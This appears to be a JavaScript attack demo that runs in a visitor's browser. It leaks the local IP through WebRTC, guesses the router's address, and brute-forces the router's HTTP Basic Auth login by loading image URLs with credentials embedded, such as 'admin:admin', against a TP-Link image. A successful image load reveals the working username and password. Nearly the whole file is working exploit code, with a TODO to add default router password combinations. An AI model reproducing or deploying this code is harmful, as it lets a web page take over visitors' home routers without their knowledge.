function detectFirefox() {
    if (navigator.userAgent.toLowerCase().indexOf('firefox') > -1) {
    //Do Firefox-related activities
    getLocalIP();
} else {
    document.write('<h3>Please use Mozilla Firefox to view this demo.</h3>');
} 
}
function getLocalIP() {
    // Get local and public IP addresses in JavaScript
    // More info here: https://github.com/diafygi/webrtc-ips
    // See also this: http://www.reddit.com/r/netsec/comments/2ts3qm/get_local_and_public_ip_addresses_in_javascript/

    // NOTE: window.RTCPeerConnection is "not a constructor" in FF22/23
    var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

    if (RTCPeerConnection) (function () {
        var rtc = new RTCPeerConnection({iceServers:[]});
        if (1 || window.mozRTCPeerConnection) {      // FF [and now Chrome!] needs a channel/stream to proceed
            rtc.createDataChannel('', {reliable:false});
        };

        rtc.onicecandidate = function (evt) {
            // convert the candidate to SDP so we can run it through our general parser
            // see https://twitter.com/lancestout/status/525796175425720320 for details
            if (evt.candidate) grepSDP("a="+evt.candidate.candidate);
        };
        rtc.createOffer(function (offerDesc) {
            grepSDP(offerDesc.sdp);
            rtc.setLocalDescription(offerDesc);
        }, function (e) { console.warn("offer failed", e); });
    
        var addrs = Object.create(null);
        addrs["0.0.0.0"] = false;
        function updateDisplay(newAddr) {
            if (newAddr in addrs) return;
            else addrs[newAddr] = true;
            var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
            var localIP = displayAddrs.join(" or perhaps ") || "n/a";
            document.getElementById('localIP').textContent = localIP;
            var routerIP = guessRouterIP(localIP);
            startAttack(routerIP);
        }
    
        function grepSDP(sdp) {
            var hosts = [];
            sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
                if (~line.indexOf("a=candidate")) {     // http://tools.ietf.org/html/rfc4566#section-5.13
                        var parts = line.split(' '),        // http://tools.ietf.org/html/rfc5245#section-15.1
                addr = parts[4],
                type = parts[7];
                        if (type === 'host') updateDisplay(addr);
                } else if (~line.indexOf("c=")) {       // http://tools.ietf.org/html/rfc4566#section-5.7
                    var parts = line.split(' '),
                    addr = parts[2];
        
                    updateDisplay(addr);
                }
            });
        }
    })(); 
}
function guessRouterIP(localIP) {
    var router = localIP.slice(0, localIP.lastIndexOf('.')) + '.1'
    document.getElementById('routerIP').textContent = router;
    return router;
}


function startAttack(routerIP) {

    // TODO: add routers default passwords comobs to myWordlistArray
    var myWordlistArray = ["1:1","2:2","3:3","4:4","5:5","6:6","7:7","8:8","9:9","10:10","11:11","12:12","13:13","14:14","15:15","16:16","17:17","18:18","19:19","20:20","21:21","22:22","23:23","24:24","25:25","26:26","27:27","28:28","29:29","30:30","31:31","32:32","33:33","34:34","35:35","36:36","37:37","admin:admin","39:39","40:40"];

    var arrayLength = myWordlistArray.length;

    // Going trought myWordlistArray and creating iframes or images
    // For "bypassing" Same-origin policy

    for (var i = 0; i < arrayLength; i++) {
        makeFrame(routerIP,myWordlistArray[i]);
    }
}

// Each frame is with random "id" so somehow
// HTTP Basic Auth is somehow not shoving pop-up with 401 responses
// It can be also bypassed with generating a lot of alerts, but you can't close it

// TODO: add local IP to this function, idea is to pass 2 parameters with setTimeout
// for testing purposes
// !! 

// Image here is TP-LINK logo, it will show green iframe after successful login

function makeFrame(routerIP,pass) {

    ifrm = document.createElement("img");
    ifrm.setAttribute("src", "http://" + pass + "@192.168.101.1/images/top1_1.jpg");
    ifrm.setAttribute("id", Math.random());
    ifrm.style.width = 30+"px";
    ifrm.style.height = 30+"px";
    
    document.body.appendChild(ifrm);
    ifrm.onload = function() {
        var mySplitResult = pass.split(":");
        document.getElementById('username').textContent = mySplitResult[0];
        document.getElementById('password').textContent = mySplitResult[1];
    }
}
